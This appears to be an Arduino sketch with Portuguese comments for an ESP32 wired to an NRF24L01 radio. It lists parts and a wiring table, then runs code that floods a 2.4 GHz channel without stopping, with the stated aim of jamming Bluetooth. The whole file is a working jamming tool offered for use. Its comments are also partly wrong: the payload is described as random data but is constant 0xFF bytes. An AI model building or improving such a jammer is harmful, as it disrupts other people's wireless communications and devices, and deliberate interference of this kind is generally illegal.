/*

🔹 Componentes principais:
ESP32 – Para gerar sinais de interferência no espectro Bluetooth.
NRF24L01 – Para enviar pacotes malformados ou aleatórios na frequência de 2.4 GHz, o que pode interferir na comunicação Bluetooth.
Fonte de alimentação 3.3V e 5V – O ESP32 e o NRF24L01 operam com diferentes tensões, então pode ser necessário um regulador de tensão (AMS1117-3.3V).
Antena (opcional) – Para ampliar a propagação do sinal de interferência (como uma antena externa no NRF24L01 com PA/LNA).
🔹 Diagrama de conexão (circuito básico):
O ESP32 se comunica com o NRF24L01 via SPI, então conectamos os pinos correspondentes:

NRF24L01	        ESP32
VCC (3.3V)	        3.3V (não 5V!)
GND	                GND
CSN (Chip Select)	GPIO 5
CE (Enable)	        GPIO 4
SCK (Clock)	        GPIO 18
MOSI (Data Out)	    GPIO 23
MISO (Data In)	    GPIO 19
IRQ (Interrupção)	(não obrigatório)

⚠️ Importante: O NRF24L01 deve ser alimentado com 3.3V, pois 5V pode danificá-lo.


*/

#include <SPI.h>
#include <nRF24L01.h>
#include <RF24.h>

#define CE_PIN 4
#define CSN_PIN 5

RF24 radio(CE_PIN, CSN_PIN);

void setup()
{
    Serial.begin(115200);
    radio.begin();
    radio.setPALevel(RF24_PA_HIGH); // Potência máxima
    radio.setChannel(10);           // Ajuste para testar diferentes canais Bluetooth (0 a 125)
}

void loop()
{
    byte payload[32];
    memset(payload, 0xFF, sizeof(payload)); // Pacotes cheios de dados aleatórios
    radio.stopListening();                  // Modo de transmissão

    while (true)
    {
        radio.write(payload, sizeof(payload)); // Envia pacotes continuamente
        delayMicroseconds(100);                // Pequeno atraso para sobrecarregar o canal
    }
}
